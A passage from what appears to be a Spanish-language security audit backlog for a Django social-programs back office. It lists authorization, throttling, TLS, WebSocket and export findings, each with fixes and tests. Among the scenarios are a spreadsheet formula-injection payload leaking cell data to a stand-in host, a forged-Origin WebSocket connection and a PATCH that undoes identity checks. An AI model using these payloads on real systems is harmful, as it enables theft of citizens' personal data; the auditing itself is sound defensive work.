- **Ubicación:** `programas/views/relevamientos.py:430-452`, `:489-503`, `:512-535` (3 exports de convocatoria); `legajos/views/ciudadanos.py:47-68` (padrón completo de ciudadanos); `legajos/views/dashboard_simple.py:80-102`; encabezados XLSX en `programas/services/exportacion_reportes.py:61`, `:93`, `:109`. `celda_segura` ya existe y la usan los reportes nuevos.
- **Escenario:** un apellido `=HYPERLINK("https://x/?"&A2;"ver")` (cargado por el link público, la app o —G1-01— desde internet) se evalúa cuando el operador abre el CSV en Excel/LibreOffice. Aporte de G3: cualquier `ciudadano.ver` (incluido el «Operador de backoffice», que no da altas) descarga el padrón completo (~100k DNI) sin límite ni registro.
- **Propuesta:** `writer.writerow([celda_segura(v) for v in fila])` en los 5 exports (en los de convocatoria, en el mismo diff de SEC-06) y en los encabezados XLSX; registrar la descarga de ciudadanos en `core.requests` con el conteo; D-20: ¿la exportación masiva necesita capacidad propia (`ciudadano.exportar`)? Default: sí, sembrada a los roles que hoy tienen `ciudadano.editar`.
- **Tests a agregar:** apellido `=1+1` → la celda sale `'=1+1` en los 5 exports (`programas/tests/test_reportes.py` y `legajos/tests/test_exportar_csv.py`).
- **Verificación:** V-STD.

### SEC-21 · Cupo: el Coordinador Regional ve y muta casos de los subsegmentos de sus pares
**Severidad:** MEDIA · **Estado:** CONFIRMADO (lectura) · **Origen:** A5-21, A1-12 (= BEC-08) · **Ola:** 2 · **Esfuerzo:** S · **Decisión:** —
- **Ubicación:** `programas/views/cupo.py:67-143` (querysets por segmento), `:146-156`, `:179-182`, `:213-216` (mutaciones con `puede_gestionar_segmento`, que para el Regional da True con todo segmento que contenga un subsegmento suyo, `programas/services/autorizacion.py:152-154`). **Contradice el Cambio 18** («ni por URL directa»).
- **Escenario:** la Regional de «Ladrillo» hace `GET /becas/cupo/segmento/<S>/` y ve nombre y DNI de beneficiarios, espera y pendientes del subsegmento «Carbón» de un par; con `becas.beneficiario.editar` hace `POST /becas/cupo/beneficiario/<pk>/baja/`.
- **Propuesta:** en los tres querysets de `CupoSegmentoDetailView`, sumar `relevamiento__convocatoria__in=convocatorias_visibles(self.request.user)` (para `ListaEspera`: `formulario__relevamiento__convocatoria__in=`); en las 3 FBV, reemplazar el chequeo por `assert_scope_formulario(user, formulario)`, moviendo `_assert_scope_formulario` de `programas/views/revision.py` a `programas/services/autorizacion.py`. Coordinar con PERF-02 (misma vista).
- **Tests a agregar:** en `programas/tests/test_coordinador_regional.py`: `test_regional_no_ve_casos_de_par_en_cupo` y `test_regional_no_da_baja_caso_de_par`.
- **Verificación:** V-STD.

### SEC-22 · Reportes, XLSX y cupo ignoran RN-P13 (casos del link público)
**Severidad:** MEDIA · **Estado:** CONFIRMADO (lectura); depende de decisión · **Origen:** A5-22, A5-31 · **Ola:** 2 · **Esfuerzo:** S-M · **Decisión:** D-22
- **Ubicación:** `programas/services/dashboard_becas.py:1093`, `:1177-1178`; `programas/views/dashboard_becas.py:158-172`; `programas/services/reportes_becas.py:20-21`, `:372-396`; `programas/views/cupo.py:89-121`, `:146-236`.
- **Escenario:** un Referente con `becas.reportes.exportar` y sin `becas.relevamiento.publico` baja el XLSX de respuestas y obtiene DNI, celular, email, GPS y respuestas de los casos del link público que en pantalla no puede ver.
- **Propuesta (default D-22 = sí):** aplicar `_sin_formularios_publicos_si_no_puede` (excluir `relevamiento__tipo=PUBLICO` cuando `not puede(user, "becas.relevamiento.publico", programa=programa_becas(user))`) en `respuestas_por_persona`, `beneficiarios_queryset`, `_formularios` y en los querysets de cupo.
- **Tests a agregar:** Referente sin la capacidad → el XLSX y la pantalla de cupo no incluyen casos PUBLICO.
- **Verificación:** V-STD.
- **Dependencias:** OPS-06 (hoy el seed apaga `becas.relevamiento.publico` en cada arranque: sin OPS-06, nadie la tiene y el filtro oculta todo lo público).

### SEC-23 · App de campo: PATCH y adjuntos sobre casos ya resueltos; PATCH expone `validado_renaper` y `client_uuid`
**Severidad:** MEDIA · **Estado:** CONFIRMADO (lectura) · **Origen:** A5-23, G1-15 · **Ola:** 2 · **Esfuerzo:** S · **Decisión:** —
- **Ubicación:** `programas/api/views.py:441-466` (`FormularioViewSet` con `UpdateModelMixin`; `perform_update` no mira `formulario.estado`), `:467-495` (adjuntos), `:56-62`; `programas/api/serializers.py:68-114` (`validado_renaper`, `client_uuid` y `capturado_en` fuera de `read_only_fields`; `client_uuid` declarado explícito pisa el `editable=False`).
- **Escenario:** con el token, `PATCH /api/becas/formularios/<id>/ {"validado_renaper": false}` sobre un caso con `identidad_forzada=True` deshace la validación manual del revisor; un PATCH semanas después sobre un APROBADO cambia `datos_identificacion` o el apoderado y vuelve a disparar `resolver_ciudadano_offline`. Ni la build de ECOM ni `origin/main` de la app hacen PATCH.
- **Propuesta:** sacar `UpdateModelMixin` de `FormularioViewSet` (dejar retrieve + adjuntos) y pasar `validado_renaper` a `read_only_fields`; en `adjuntos` (POST), `if formulario.estado != Formulario.Estado.ENVIADO: return 409`. El sync offline legítimo solo crea casos (POST a `relevamientos/<id>/formularios/`).
- **Tests a agregar:** `programas/tests/test_becas_api.py::test_patch_formulario_405` y `::test_adjunto_sobre_aprobado_409`.
- **Verificación:** V-STD + `manage.py test programas.tests.test_becas_api`.

### SEC-24 · La app de campo se autovalida la identidad con `origen: personas`
**Severidad:** MEDIA · **Estado:** CONFIRMADO (lectura) · **Origen:** A5-24 · **Ola:** 2 · **Esfuerzo:** M · **Decisión:** D-24
- **Ubicación:** `programas/api/views.py:115-122` (`elif origen in ("personas","gran_base"): validado = bool(nombre and apellido)`); el comentario de `:146` («el cliente nunca puede autovalidarse») no se cumple. El Cambio 57 registra «la app no puede autovalidarse (mismo principio que hoy con personas/scan)»: **hay que corregir el registro o el código**.
- **Escenario:** un token de campo manda una identidad inventada con `"origen":"personas"` y el caso queda `validado_renaper=True`.
- **Propuesta:** con origen `personas`, re-consultar en el servidor `identificar(formulario.relevamiento, dni, sexo)` (cacheado) y validar solo si coincide. Default D-24: `scan` cuenta como validación (registrarlo como decisión), `personas` no sin re-consulta.
- **Tests a agregar:** invertir `programas/tests/test_becas_api.py:453` (hoy fija el comportamiento actual); `test_origen_personas_no_coincide_no_valida`.
- **Verificación:** V-STD.
- **Dependencias:** G1-05 (validación del resto del formulario en el servidor).

### SEC-25 · `consultar_persona_becas` sin throttle (enumeración contra la Gran Base)
**Severidad:** MEDIA · **Estado:** CONFIRMADO (lectura) · **Origen:** A5-25 · **Ola:** 2 · **Esfuerzo:** S · **Decisión:** D-25

**⚠ Actualizar (03-oct-2026):** la tasa `DEFAULT_THROTTLE_RATES["renaper"]` quedó sin consumidor al borrar `RenaperRateThrottle` (SEC-04, #509): usarla acá o borrarla (R0-05).
- **Ubicación:** `programas/api/views.py:212-250` (sin `throttle_classes`; devuelve nombre, apellido y nacimiento de cualquier DNI y sexo).
- **Propuesta:** `@throttle_classes([ScopedRateThrottle])` con `throttle_scope = "personas_campo"` y en settings `"personas_campo": "120/hour"` (default D-25; por usuario porque el request está autenticado). Aplica también al alias `/api/becas/renaper/consultar/`.
- **Tests a agregar:** N+1 consultas → 429.
- **Verificación:** V-STD.

### SEC-26 · Login, `/admin/`, recupero, clave provisoria y token de campo sin límite, validadores ni rotación
**Severidad:** MEDIA · **Estado:** CONFIRMADO (lectura; token y clave provisoria con test `poc/test_repro_usuarios.py::G1b03y04TokenCampoTests`) · **Origen:** A5-15, A5-35, A5-37, G1b-03, G1b-04 · **Ola:** 2 · **Esfuerzo:** M · **Decisión:** D-26 (clave provisoria del territorial)
- **Ubicación:** `users/views/auth.py:13-38` y `users/forms/auth.py:29-41` (sin throttle); `config/urls.py:26` (`admin/`) y `:36-37` (`django.contrib.auth.urls` en la raíz); `programas/api/views.py:89-102` (`ObtainCampoToken`: `Token.get_or_create`, sin vencimiento, no mira `debe_cambiar_contrasena`); `users/middleware.py:46-48` (la clave provisoria no aplica en `/api/`); `users/api_views/__init__.py:73-90` y `users/serializers/__init__.py:105-115` (`change_password` sin `validate_password`); `users/services/correo.py:79-83`, `users/views/auth.py:57` (solo ahí se limpia el flag).
- **Escenario:** fuerza bruta distribuida contra `/`, `/admin/login/`, `/api/becas/auth/token/`; un token filtrado del teléfono sirve indefinidamente (reproducido: el token viejo da 200 en `/api/becas/relevamientos/` después de `set_password`; ningún `Token…delete()` en el repo); un territorial (`territorial_mobile_only`) es rechazado por el login web pero `/api/becas/auth/token/` le da 200 con la clave provisoria y `debe_cambiar_contrasena` queda en True para siempre; además el correo `users/templates/user/email/credenciales_usuario.txt` le promete «el sistema te va a pedir que cambies la contraseña en tu primer ingreso», que para él es falso (contradice el Cambio 37).
- **Propuesta:**
  1. `UsuariosAuthenticationForm.clean`: `if rate_limit_excedido(self.request, "login", 10, 600) or rate_limit_excedido(self.request, "login_user", 10, 600, sufijo=username.lower(), incluir_ip=False): raise ValidationError(...)`. Lo mismo en una subclase propia de `PasswordResetView`.
  2. Borrar el include de `django.contrib.auth.urls` (`config/urls.py:36-37`): no hay referencias a sus nombres; `users.urls` y portal definen `success_url` propios. Ojo con G2-03: el cambio voluntario de clave necesita un flujo propio con clave actual.
  3. Token de campo: signal `post_save` de `User` (o llamada explícita en `_apply_user_data`, `entregar_credenciales_provisorias`, `CambioContrasenaObligatorioView` y el reset) que, si cambió el hash, haga `Token.objects.filter(user=user).delete()`; `ScopedRateThrottle` en `ObtainCampoToken`.
  4. Clave provisoria del territorial (D-26): (a) `ObtainCampoToken` responde 403 `code=debe_cambiar_contrasena` + endpoint API para fijar clave (requiere release de la app), o (b) para usuarios solo-campo, mandar un link de reseteo en vez de la clave en texto plano. En ambos casos, `PasswordResetConfirmView` propio que limpie el flag, y corregir el texto del correo. Default: (b), sin release de la app.
  5. `change_password` por API: desaparece si se apaga la API (SEC-05); si no, `validate_password`, `update_session_auth_hash`, borrar el Token y throttle.
  6. Restringir `/admin/` por IP en nginx/ingress (ver también G1c-10).
- **Tests a agregar:** N intentos → bloqueo; `test_token_viejo_401_tras_cambio_de_clave` (el de la PoC invertido); `test_territorial_con_provisoria_no_obtiene_token` o `test_correo_territorial_lleva_link_de_reset` según D-26; `resolve("/password_reset/")` → 404.
- **Verificación:** V-STD + `manage.py test users programas.tests.test_becas_api`.
- **Dependencias:** SEC-05, G2-03, G1b-08.

### SEC-27 · RENAPER con `verify=False` y las advertencias TLS apagadas para todo el proceso
**Severidad:** MEDIA · **Estado:** CONFIRMADO (lectura) · **Origen:** A2-10 · **Ola:** 2 · **Esfuerzo:** S · **Decisión:** D-27 (ECOM confirma la cadena)
- **Ubicación:** `legajos/services/consulta_renaper.py:19-20` (`urllib3.disable_warnings(InsecureRequestWarning)` al importar: silencia también SIIS, Personas y reCAPTCHA), `:268` y `:278` (`verify=False`).
- **Propuesta:** `verify=getattr(settings, "RENAPER_CA_BUNDLE", "") or True` y borrar el `disable_warnings`. Variable nueva `RENAPER_CA_BUNDLE` en settings y en la plantilla de entornos. Riesgo: si RENAPER usa una CA privada, se corta hasta cargar el bundle: validar con `diagnosticar_integraciones` en cada ambiente antes de desplegar.
- **Tests a agregar:** mock de `session.post` que afirme `kwargs["verify"] is not False` con la configuración por defecto.
- **Verificación:** V-STD + `manage.py diagnosticar_integraciones` en DEV/QA.

### G1c-04 · `/ws/alertas/` difunde fuera de alcance, no revalida la sesión ni la capacidad y no chequea el origen
**Severidad:** MEDIA · **Estado:** CONFIRMADO con test (`poc/test_repro_admin_cron_renaper.py::G1c04WsAlertasTests`) · **Origen:** G1c-04 (verificado en G3) · **Ola:** 2 · **Esfuerzo:** M · **Decisión:** —
- **Ubicación:** `conversaciones/consumers.py:212-251` (solo `rbac.puede("ciudadano.ver")` + `group_add("alertas_sistema")`); `legajos/services/alertas.py:165-190` (`group_send` con nombre y mensaje); `config/asgi.py:16-21` (sin `AllowedHostsOriginValidator`).
- **Escenario (reproducido):** (a) un usuario con solo `ciudadano.ver` recibe por WS una alerta que por HTTP no ve (`RIESGO_SUICIDA`, `VIOLENCIA`, `EVENTO_CRITICO`; el «Operador de backoffice» tiene `ciudadano.ver` sin `ciudadano.sensible`), también como notificación del sistema operativo (`alertas_websocket.js:70-75`); (b) después de quitarle el rol, el socket abierto sigue recibiendo; (c) con la sesión reemplazada (HTTP → 302 al login), el WS conecta igual; (d) conecta con `Origin: https://evil.example` (CSWSH desde un sitio hermano de `*.chaco.gob.ar` / `*.ecomdev.ar`, cookie `Lax`: PLAUSIBLE). Agravante: cada pasada horaria de `generar_alertas` recrea y redifunde (LEG-01).
- **Propuesta:** (1) `config/asgi.py`: `"websocket": AllowedHostsOriginValidator(AuthMiddlewareStack(URLRouter(...)))` (cierra también el CSWSH de los consumers de conversaciones); (2) `AlertasConsumer.connect`: exigir `ciudadano.sensible` (misma regla que SEC-11) y rechazar si `profile.backoffice_session_key != scope["session"].session_key` o si `debe_cambiar_contrasena`; (3) en `nueva_alerta`, filtrar por alcance con `await database_sync_to_async(FiltrosUsuarioService.obtener_alertas_usuario(user).filter(pk=id).exists)()` y revalidar `rbac.puede` cada N minutos (cerrar con 4403); alternativa más barata: un grupo por usuario y que el emisor mande solo a los usuarios con alcance.
- **Tests a agregar:** el de la PoC invertido con `WebsocketCommunicator`: Origin ajeno → `connect` False; sin alcance → `receive_nothing()` True; sesión reemplazada → False.
- **Verificación:** V-STD + `manage.py test conversaciones legajos`.
- **Dependencias:** SEC-18, SEC-11; G1c-17 y G3-03 en el mismo PR.

## BAJA

### SEC-30 · Requisitos, subsegmentos y coordinadores validados solo contra el segmento (Coordinador Regional, latente)
**Severidad:** BAJA · **Estado:** CONFIRMADO (lectura); explotable solo si al Regional le tildan `becas.requisito.*` o `subsegmento.crear` · **Origen:** A5-26 · **Ola:** 2 · **Esfuerzo:** S
- **Ubicación:** `programas/views/configuracion.py:465-467`, `:581-606`, `:641-645`, `:671-677`; `programas/services/autorizacion.py:229-243`.
- **Propuesta:** `_assert_scope_subsegmento` cuando hay subsegmento; si es a nivel segmento y el usuario es Regional → 403.
- **Test:** Regional + `requisito.editar` → 403 sobre el requisito de un par.

### SEC-31 · Padrón .xlsx: límite de 2 MB solo sobre el archivo comprimido (zip bomb)
**Severidad:** BAJA · **Estado:** PLAUSIBLE · **Origen:** A5-28 · **Ola:** 2 · **Esfuerzo:** S
- **Ubicación:** `programas/services/padron.py:158-164`, `:173`.
- **Propuesta:** sumar los `file_size` del zip antes de openpyxl (tope ~20 MB) y cortar `iter_rows` por `max_row`.
- **Test:** xlsx inflado → `ValidationError`.

### SEC-32 · Consulta RENAPER desde la admisión sin `ciudadano.*`, por GET y sin throttle
**Severidad:** BAJA · **Estado:** CONFIRMADO (lectura) · **Origen:** A5-30 · **Ola:** 2 · **Esfuerzo:** S
- **Ubicación:** `programas/views/admisiones.py:62-83` (`GET /dispositivos/<pk>/admisiones/nueva/?dni=…&sexo=M` como buscador RENAPER con solo `dispositivo.admitir`).
- **Propuesta:** exigir `ciudadano.crear` antes de consultar (ya se exige al crear, `:107`), throttle y registro.

### SEC-33 · El mapa del caso envía las coordenadas GPS del domicilio a OpenStreetMap
**Severidad:** BAJA · **Estado:** CONFIRMADO (lectura) · **Origen:** A5-34 · **Ola:** 2 · **Esfuerzo:** S
- **Ubicación:** `programas/views/revision.py:679-696` (cada apertura manda lat/lng exactas, IP y Referer).
- **Propuesta:** cargar el iframe solo con un clic («Ver en mapa») y `referrerpolicy="no-referrer"`. Es UI: V-UI.

### SEC-34 · `EntregaMercaderiaCreateView` busca el objeto antes de autorizar
**Severidad:** BAJA · **Estado:** CONFIRMADO (lectura) · **Origen:** A5-36 · **Ola:** 2 · **Esfuerzo:** S
- **Ubicación:** `programas/views/merenderos.py:188-190` (un anónimo distingue ids existentes —redirect al login— de inexistentes —404—).
- **Propuesta:** hacer el lookup después de `super().dispatch`.

### SEC-35 · Cookies seguras y HSTS dependen de `ENVIRONMENT=prd`; el timeout por inactividad es solo del cliente
**Severidad:** BAJA · **Estado:** PLAUSIBLE (depende de las variables en ECOM) · **Origen:** A5-38 · **Ola:** 2 · **Esfuerzo:** S · **Decisión:** pregunta ECOM (variables)
- **Ubicación:** `config/settings.py:23`, `:365-378`, `:604-622`. Sin `ENVIRONMENT=prd` quedan `SESSION_COOKIE_SECURE=False`, `CSRF_COOKIE_SECURE=False`, HSTS 0; `SESSION_IDLE_TIMEOUT_MINUTES` solo actúa en JS; `USE_X_FORWARDED_HOST=True` con nginx pasando el `X-Forwarded-Host` del cliente.
- **Propuesta:** `SESSION_COOKIE_SECURE = CSRF_COOKIE_SECURE = not DEBUG`; middleware de expiración por inactividad del lado del servidor (`last_activity` en sesión); `proxy_set_header X-Forwarded-Host $host;` en nginx. Ver OPS-12 (QA declara `prd`).
- **Test:** `manage.py check --deploy` con `DEBUG=False` y `ENVIRONMENT` sin setear.

### SEC-36 · `programa_list` sin capacidad; errores internos al usuario
**Severidad:** BAJA · **Estado:** CONFIRMADO (lectura) · **Origen:** A5-39 (parte; el `run_phase2_tests_api` va en OPS-10), G1b-10 (texto crudo) · **Ola:** 2 · **Esfuerzo:** S
- **Ubicación:** `configuracion/views/programas.py:52-53` (`programa_list` solo `login_required`); `users/views/admin.py:77-80`, `:137-140` (`f"Error al guardar el usuario: {exc}"`); `core/views/performance.py` (`str(e)`).
- **Propuesta:** `@requiere("programa.configurar", "config.ver")` en `programa_list`; mensajes genéricos + `logger.exception`.

### SEC-37 · Link público, paso 2: muestra nombre y fecha de nacimiento a partir de DNI + sexo
**Severidad:** BAJA (riesgo aceptado: RN-P7 y Cambio 71) · **Estado:** CONFIRMADO · **Origen:** A5-43 · **Ola:** 2 · **Esfuerzo:** S · **Decisión:** D-37
- **Ubicación:** `portal/views/inscripcion.py:126-137`, `:188-195`; `portal/templates/portal/inscripcion/paso2.html:25-26`. Mitigaciones existentes: captcha, cubeta por IP (10/10 min), por DNI (15/h), vigencia 45 min.
- **Propuesta:** si el PM reabre el Cambio 71: nombre enmascarado. En todo caso exigir reCAPTCHA real en `prd` (SIIS-21).

### G1c-10 · `/admin/` y `admin/doc/` montados en todos los entornos
**Severidad:** BAJA (baja desde MEDIA) · **Estado:** CONFIRMADO-AJUSTADO (mayormente duplicado de DAT-02 y SEC-26) · **Origen:** G1c-10 · **Ola:** 2 · **Esfuerzo:** S
- **Ubicación:** `config/urls.py:25-26` (`admin/` y `admin/doc/` en todos los entornos); `users/admin.py:9-33` (un `UserAdmin` estándar deja a un staff con `change_user` tildar `is_superuser`; hoy no existe ese staff: ningún flujo pone `is_staff`).
- **Propuesta:** quitar `admin/doc/`; en `UserAdmin`, `readonly_fields` = `is_superuser`, `groups`, `user_permissions` para no superusuarios; restringir `/admin/` por IP (SEC-26); `has_delete_permission` en DAT-02.

### G1c-16 · Payload crudo de RENAPER en sesión (24 h) y caché (10 min)
**Severidad:** BAJA · **Estado:** CONFIRMADO (lectura) · **Origen:** G1c-16 · **Ola:** 2 · **Esfuerzo:** S
- **Ubicación:** `legajos/services/ciudadanos.py:27-29` (guarda `datos_api` crudo en la sesión, Redis en prd, hasta confirmar o abandonar); `legajos/services/consulta_renaper.py:360-372`, `:489` (caché 10 min); `legajos/views/ciudadanos.py:185`.
- **Propuesta:** lista blanca de campos en sesión; no cachear `datos_api`; limpiar la sesión en el GET de `ciudadano_nuevo`.

## Seguimientos de la revisión de la Ola 0 (agregados el 03-oct-2026)

Observaciones MINOR que dejaron los revisores de los PRs de la Ola 0. No son de la base auditada (`917e583`):
las líneas son de `origin/development @ 7393c41`.

### R0-01 · `/conversaciones/<id>/evaluar/` acepta escritura anónima
**Severidad:** BAJA (MINOR del revisor) · **Estado:** CONFIRMADO (lectura) · **Origen:** revisión de la Ola 0 · **Ola:** 0 · **Esfuerzo:** S

**Resolución:** ✅ Resuelto en #537 (Cambio 111), 03-oct-2026 — ruta `<id>/evaluar/` desmontada (default «desmontar», sin consumidor). Se borró la cadena entera: `conversaciones/views/public.py`, la `evaluar_conversacion` homónima del backoffice (la pública la tapaba por orden de import), `EvaluarConversacionForm` y el servicio. `Conversacion.satisfaccion` y sus métricas quedan. Tests en `conversaciones/tests/test_public.py`.
- **Ubicación:** `conversaciones/urls.py:21` → `conversaciones/views/public.py:29` (`evaluar_conversacion`, sin `login_required` ni dueño).
- **Escenario:** un anónimo con la cookie CSRF hace `POST /conversaciones/<n>/evaluar/` con `{"satisfaccion": …}` y pisa la evaluación de cualquier conversación por id. Lo dejó el revisor de #510 (G1-01) como MINOR: no expone datos, pero es la última escritura anónima de la app.
- **Propuesta:** desmontar la ruta (el chat público que la usaba ya no existe) o exigir `login_required` + permiso de conversaciones; se resuelve también con la fase 2 de G1-01.
- **Test:** `POST` anónimo a `/conversaciones/<id>/evaluar/` → 404 (o 302) y la conversación sin cambios.

### R0-05 · `DEFAULT_THROTTLE_RATES["renaper"]` sin consumidor
**Severidad:** BAJA (MINOR del revisor) · **Estado:** CONFIRMADO (lectura) · **Origen:** revisión de la Ola 0 · **Ola:** 2 (con SEC-25) · **Esfuerzo:** incluido en SEC-25
- **Ubicación:** `config/settings.py:421`. El único consumidor era `RenaperRateThrottle`, borrado con SEC-04 (#509).
- **Propuesta:** usarla en el throttle de `consultar_persona_becas` (SEC-25) o borrarla.

## Seguimientos de la revisión de la Ola 0, segunda tanda (agregados el 03-oct-2026)

Observaciones MINOR de los revisores de #536-#542 y seguimientos operativos. Las líneas son de
`origin/development @ 719dc0a`.

### R0b-04 · `retrieve` de `/api/legajos/ciudadanos/<pk>/` da 404 sin `?search=`
**Severidad:** BAJA (MINOR del revisor de #542) · **Estado:** CONFIRMADO (lectura) · **Origen:** revisión de la Ola 0, 2ª tanda · **Ola:** 2 (PR 3, Legajos) · **Esfuerzo:** S
- **Ubicación:** `legajos/api_views/__init__.py:49-59` (`get_queryset` devuelve `none()` con menos de 3 caracteres de `?search=`, también en `retrieve`).
- **Escenario:** `GET /api/legajos/ciudadanos/<pk>/` con `ciudadano.ver` → 404 aunque el ciudadano exista. Hoy no hay consumidor (el único es el `?search=` de `ciudadano_detail.html`), pero el 404 engaña a quien lo use después.
- **Propuesta:** decidirlo y dejarlo explícito: aplicar el mínimo de búsqueda solo si `self.action == "list"`, o sacar `retrieve` del ViewSet (`mixins.ListModelMixin` + `GenericViewSet`) para que la ruta no exista.
- **Test:** `retrieve` con `ciudadano.ver` → 200 (o ruta inexistente), sin capacidad → 403.

### R0b-05 · `CiudadanoViewSet` declara `ordering` sin `OrderingFilter`: pagina sin orden estable
**Severidad:** BAJA (MINOR del revisor de #542) · **Estado:** CONFIRMADO (lectura) · **Origen:** revisión de la Ola 0, 2ª tanda · **Ola:** 2 (PR 3, Legajos) · **Esfuerzo:** incluido en R0b-04
- **Ubicación:** `legajos/api_views/__init__.py:43-47` (`filter_backends = [DjangoFilterBackend, filters.SearchFilter]`; `ordering_fields`/`ordering` solo los lee `OrderingFilter`).
- **Propuesta:** sumar `filters.OrderingFilter` a `filter_backends` (o `.order_by("apellido", "nombre", "pk")` en `get_queryset`) para que la paginación sea determinística.
- **Test:** dos páginas consecutivas de una búsqueda no repiten ni saltean filas.

### R0b-06 · `AlertasViewSet` sin capacidad decidida
**Severidad:** BAJA (MINOR del revisor de #542) · **Estado:** CONFIRMADO (lectura) · **Origen:** revisión de la Ola 0, 2ª tanda · **Ola:** 2 (con SEC-18) · **Esfuerzo:** incluido en SEC-18
- **Ubicación:** `legajos/api_views/__init__.py:65-72` (`permission_classes = [BackofficeAutenticado, IsAuthenticated]`; el queryset ya sale de `FiltrosUsuarioService`).
- **Propuesta:** `RequiereCapacidad("ciudadano.ver")` para `list`/`count` y la que fije D-11 para el contenido de la alerta; `cerrar` con `get_object()` (SEC-18). Mismo criterio que `alertas_criticas` (SEC-14).
- **Test:** sin capacidad → 403 en `list`, `count` y `cerrar`.

### R0b-07 · `config/urls.py` monta `/media/` abierto con `DEBUG=True` antes del bloque `SERVE_MEDIA`
**Severidad:** BAJA (MINOR del revisor de #538) · **Estado:** CONFIRMADO (lectura) · **Origen:** revisión de la Ola 0, 2ª tanda · **Ola:** 2 (PR 7, Media) · **Esfuerzo:** S
- **Ubicación:** `config/urls.py:67` (`urlpatterns += static(settings.MEDIA_URL, ...)`, sin login, activo con `DEBUG=True`) antes de `:72-81` (`login_required(_media_serve)`). Con los dos activos gana el primero.
- **Escenario:** un ambiente con `DEBUG=True` y `SERVE_MEDIA=True` sirve `/media/` sin sesión.
- **Propuesta:** no registrar `static(MEDIA_URL)` cuando `SERVE_MEDIA=True` (o nunca: usar siempre la ruta con login, también en dev); en la etapa 2 de SEC-09 la reemplaza `media_protegida`.
- **Test:** con `DEBUG=True` y `SERVE_MEDIA=True`, anónimo → 302.

### R0b-08 · Comentarios que todavía dicen que nginx sirve `/media/`
**Severidad:** BAJA (MINOR del revisor de #538) · **Estado:** CONFIRMADO (lectura) · **Origen:** revisión de la Ola 0, 2ª tanda · **Ola:** 2 (PR 7, Media) · **Esfuerzo:** incluido en R0b-07
- **Ubicación:** `.env.qa.example:77-79` («en la VM lo sirve nginx y esto queda en False»: falso desde #538, la VM usa `SERVE_MEDIA=True`); también `docs/client/architecture.md:203` («excepto `/static/` y `/media/`»: el middleware ya no exime `/media/`; ese mismo párrafo es el de R0-02).
- **Propuesta:** reescribir los dos textos según SEC-09 etapa 1.

### R0b-09 · `actividad_reciente` pide `ciudadano.sensible` pero muestra inscripciones y derivaciones sin alcance
**Severidad:** BAJA (MINOR del revisor de #541) · **Estado:** CONFIRMADO (lectura) · **Origen:** revisión de la Ola 0, 2ª tanda · **Ola:** 2 (PR 3, Legajos) · **Esfuerzo:** S
- **Ubicación:** `dashboard/api_views/__init__.py:135-146` (`@permission_classes([BackofficeAutenticado, RequiereCapacidad("ciudadano.sensible")])`; `InscripcionPrograma.objects…` y `DerivacionPrograma.objects…` globales; solo las alertas pasan por `FiltrosUsuarioService`).
- **Escenario:** la capacidad no corresponde al contenido: quien tiene `ciudadano.sensible` ve las últimas inscripciones y derivaciones de todos los programas, y quien solo tiene `ciudadano.ver` no ve nada.
- **Propuesta:** separar por tipo de evento: inscripciones y derivaciones con `ciudadano.ver` (acotadas como en SEC-12/D-12), alertas con `ciudadano.sensible` (D-11); o partir el feed en dos endpoints.
- **Test:** con `ciudadano.ver` solo, el feed trae inscripciones y no alertas; sin capacidad → 403.

### R0b-11 · Desplegar SEC-09 etapa 1 en icore-srv (operativo, PM)
**Severidad:** — (operativo, sin código) · **Origen:** #538 (Cambio 112) · **Ola:** PM · **Esfuerzo:** —
- **Qué:** hasta desplegarlo, DEV (`relevamiento-deshum.ecomdev.ar`) sigue sirviendo `/media/` por nginx sin login y con `expires 7d`.
- **Orden:** pull → build y recrear **`web` primero** (con `SERVE_MEDIA=True`) → después `nginx` (el gotcha de IP cacheada obliga a reiniciarlo igual). Si `nginx` va antes, `/media/` cae en Django sin la ruta y los adjuntos dan 404.
- **Verificación:** `curl -I https://relevamiento-deshum.ecomdev.ar/media/<ruta_conocida>` sin cookie → 302; con sesión de backoffice → 200. Los archivos que ya bajó alguien pueden seguir en cachés de navegador hasta 7 días.
